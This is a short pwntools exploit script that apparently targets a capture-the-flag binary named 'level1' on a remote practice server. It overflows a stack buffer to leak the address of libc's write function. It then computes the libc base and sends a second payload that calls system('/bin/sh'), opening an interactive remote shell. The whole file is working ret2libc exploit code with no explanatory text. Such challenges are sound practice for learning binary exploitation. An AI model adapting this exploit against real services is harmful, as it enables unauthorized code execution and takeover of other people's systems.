from pwn import *

context(log_level='debug',os='linux',arch='i386')

p=remote('node5.buuoj.cn',30000)

elf=ELF('/home/lixingjian/pwn/level1')
libc=ELF('/home/lixingjian/libc/libc-2.23-i386.so')

write_plt=elf.plt['write']
write_got=elf.got['write']
vul_addr=0x804847B

payload=b'a'*(0x88)+p32(0)+p32(write_plt)+p32(vul_addr)+p32(1)+p32(write_got)+p32(4)

p.sendline(payload)
write_libc=u32(p.recv(4))

write_offset=libc.symbols['write']
libc_base=write_libc-write_offset

system_addr=libc_base+libc.symbols['system']
binsh=libc_base+libc.search(b'/bin/sh\x00').__next__()

payload=b'a'*(0x88)+p32(0)+p32(system_addr)+p32(0)+p32(binsh)
p.sendline(payload)

p.interactive()
